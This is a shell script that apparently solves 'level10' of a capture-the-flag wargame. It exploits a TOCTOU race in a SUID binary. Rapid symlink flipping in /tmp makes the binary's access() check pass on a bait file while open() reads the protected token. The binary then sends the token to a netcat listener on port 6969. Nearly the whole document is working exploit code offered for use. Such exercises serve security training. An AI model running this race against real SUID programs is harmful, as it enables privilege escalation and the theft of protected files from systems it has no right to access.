#!/bin/sh
# level10 TOCTOU race.
#
# The SUID binary does access(file, R_OK) as the REAL user (level10), then
# open()+send as the EFFECTIVE user (flag10). Between those two calls the
# path /tmp/x is re-resolved, so we flip it between a file we can read
# (access() passes) and the token (open() dumps it as flag10).
#
# Usage: ./race.sh <IP>     # binary connects to <IP>:6969 (port hardcoded)
# Run a listener first in another terminal:  nc -lnvp 6969

IP="$1"
[ -z "$IP" ] && { echo "usage: $0 <IP>"; exit 1; }

BIN=/home/user/level10/level10
TOKEN=/home/user/level10/token
LINK=/tmp/x
BAIT=/tmp/myfile          # a file level10 can really read -> access() succeeds

echo bait > "$BAIT"

# Loop 1: flip the symlink target as fast as possible.
while :; do
    ln -sf "$BAIT"  "$LINK"
    ln -sf "$TOKEN" "$LINK"
done &
flip=$!

# Loop 2: fire the binary at the listener over and over.
while :; do
    "$BIN" "$LINK" "$IP" 2>/dev/null
done &
fire=$!

# Ctrl-C stops both loops and cleans up.
trap 'kill "$flip" "$fire" 2>/dev/null; rm -f "$LINK" "$BAIT"; echo; echo stopped; exit 0' INT

echo "racing against $IP:6969 -- watch the listener, Ctrl-C to stop"
wait
